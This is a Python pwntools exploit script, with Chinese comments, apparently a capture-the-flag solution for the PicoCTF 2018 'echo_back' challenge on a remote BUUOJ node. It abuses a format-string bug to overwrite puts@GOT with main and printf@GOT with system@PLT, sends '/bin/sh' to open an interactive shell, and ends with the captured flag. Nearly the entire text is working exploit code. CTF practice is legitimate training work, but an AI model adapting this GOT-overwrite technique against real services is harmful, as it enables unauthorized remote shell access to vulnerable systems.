from pwn import *

# format str任意地址写，估计是修改got表？
context(os = 'linux', arch = 'i386')
# context.log_level = 'debug'
e = ELF('./PicoCTF_2018_echo_back')

main_addr = 0x8048643
puts_got = e.got['puts']
printf_got = e.got['printf']
system_plt = e.plt['system']
# print(hex(puts_got), hex(main_addr), 'hex(296515): {}'.format(hex(296515)))


# hh😁发现一个有趣的点，如果这里的write_size写为int的话，理论上来说我们确实同样可以改写puts_got的内容。但是由于一次写入的内容是4字节，所以前面输出的字符将会是0x8048643个！
# 这会导致极长的程序运行与等待时间，所以选用short或者byte更合适，这样每次交互时接收的无用字符可以降低到0x8643或者0x86/0x43个，节约时间。
payload1 = fmtstr_payload(offset=7, writes = {puts_got: main_addr}, write_size='byte')
print(payload1)

# 修改puts@got 为 main函数，进入循环，使得我们能够进行第二次输入
p = remote('node4.buuoj.cn', 25473)
p.recvuntil(b'input your message:\n')
p.sendline(payload1)

# 修改printf@got 为 system@plt
payload2 = fmtstr_payload(offset=7, writes = {printf_got: system_plt}, write_size='byte')
p.recvuntil(b'input your message:\n')
p.sendline(payload2)

# 执行system('/bin/sh')
payload3 = b'/bin/sh\x00'
p.recvuntil(b'input your message:\n')
p.sendline(payload3)
p.interactive()

# flag{53a58752-4a5e-4a1c-85de-0e280cc22178}

